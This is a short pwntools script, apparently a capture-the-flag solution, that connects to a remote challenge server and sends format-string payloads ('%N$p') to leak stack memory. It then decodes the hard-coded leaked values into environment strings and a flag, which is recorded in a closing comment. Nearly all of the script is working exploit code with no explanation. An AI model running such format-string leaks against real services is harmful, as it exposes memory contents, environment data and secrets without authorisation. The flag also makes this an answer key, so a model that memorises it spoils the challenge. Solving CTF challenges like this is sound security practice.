from pwn import *

r = remote("jh2i.com", 50038)
for i in range(100,300):
    try:
        r.sendline("%"+str(i)+"$p")
        #data = r.recvuntil("------------------------")
    except:
        r.close()
r.close()

l = [
    0x632f2e0000000000,
    0x65676e656c6c6168,
    0x5f45544f4d455200,
    0x3736313d54534f48,
    0x3134312e3237312e,
    0x534f48003732312e,
    0x31643d454d414e54,
    0x6464303862653761,
    0x3d454d4f48006462,
    0x4c4f00746f6f722f,
    0x50002f3d44575044,
    0x7273752f3d485441,
    0x732f6c61636f6c2f,
    0x7273752f3a6e6962,
    0x622f6c61636f6c2f,
    0x2f7273752f3a6e69,
    0x73752f3a6e696273,
    0x732f3a6e69622f72,
    0x6e69622f3a6e6962,
    0x6f682f3d44575000,
    0x46006e77702f656d,
    0x7b534c4c3d47414c,
    0x6174735f6b636174,
    0x65726f6d5f3f6b63,
    0x74735f656b696c5f,
    0x617474615f6b6361,
    0x68632f2e007d6b63,
    0x65676e656c6c6100
]

for s in l:
    print p64(s)
"""
LLS{tack_stack?_more_like_stack_attack}
"""
